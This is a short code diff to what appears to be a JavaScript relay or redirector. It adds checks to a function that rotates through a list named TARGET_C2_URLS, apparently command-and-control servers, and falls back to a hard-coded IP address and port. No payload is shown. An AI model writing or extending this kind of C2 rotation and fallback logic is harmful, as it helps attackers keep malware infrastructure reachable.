@@ -14,9 +14,20 @@ const TARGET_C2_URLS = process.env.TARGET_C2_URLS ? process.env.TARGET_C2_URLS.s
 // Function to select a target URL (simple rotation or random selection)
 let currentTargetIndex = 0;
 function getCurrentTargetUrl() {
+  // Validate the list of target URLs
+  if (!TARGET_C2_URLS || TARGET_C2_URLS.length === 0) {
+    console.error('[Target URL Error] No target URLs defined. Using fallback.');
+    return 'http://31.57.147.77:6464';
+  }
   const targetUrl = TARGET_C2_URLS[currentTargetIndex];
   // Rotate to next target for the next request (simple round-robin)
   currentTargetIndex = (currentTargetIndex + 1) % TARGET_C2_URLS.length;
+  // Validate the selected target URL
+  if (!targetUrl || typeof targetUrl !== 'string' || !targetUrl.startsWith('http')) {
+    console.error(`[Target URL Error] Invalid target URL: ${targetUrl}. Using fallback.`);
+    return 'http://31.57.147.77:6464';
+  }
+  console.log(`[Target URL] Selected target URL: ${targetUrl}`);
   return targetUrl;
 }
 
